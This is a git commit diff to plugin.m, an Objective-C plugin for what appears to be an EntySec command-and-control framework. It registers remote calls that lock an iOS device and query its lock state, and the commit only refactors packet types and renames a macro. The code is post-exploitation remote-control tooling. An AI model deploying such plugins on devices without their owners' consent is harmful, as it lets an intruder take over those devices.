5f06c847ec9583708eec31ae8538fb558d19b18e
Ivan Nikolsky <enty8080@gmail.com>
2023-07-14 20:26:15 +0200

    Update plugin.m

--- plugin.m
+++ plugin.m
@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2022 EntySec
+ * Copyright (c) 2020-2023 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -22,7 +22,7 @@
  * SOFTWARE.
  */
 
-#define ICTL_SCOPE 3
+#define ICTL_POOL 3
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
@@ -39,24 +39,24 @@ static NSString *ictl_talk_reply(NSMutableArray *args)
     return [reply objectForKey:@"returnStatus"];
 }
 
-static c2_api_call_t *ictl_lock(tlv_transport_pkt_t tlv_transport_packet)
+static tlv_pkt_t *ictl_lock(tlv_pkt_t *tlv_packet)
 {
     ictl_talk([@[@"lock"] mutableCopy]);
-    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, API_CALL_SCSEMPT);
+    return craft_c2_tlv_pkt(tlv_packet, API_CALL_SUCCESS, NULL);
 }
 
-static c2_api_call_t *ictl_state(tlv_transport_pkt_t tlv_transport_packet)
+static tlv_pkt_t *ictl_state(tlv_pkt_t *tlv_packet)
 {
     NSString *result = ictl_talk([@[@"state"] mutableCopy]);
-    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, [result UTF8String]);
+    return craft_c2_tlv_pkt(tlv_packet, API_CALL_SUCCESS, [result UTF8String]);
 }
 
 int main(void)
 {
     c2_api_calls_t *c2_api_calls_table = NULL;
 
-    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL, ictl_lock, ICTL_SCOPE);
-    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL + 1, ictl_state, ICTL_SCOPE);
+    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL, ictl_lock, ICTL_POOL);
+    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL + 1, ictl_state, ICTL_POOL);
 
     tab_console_loop(c2_api_calls_table);
     c2_api_calls_free(c2_api_calls_table);
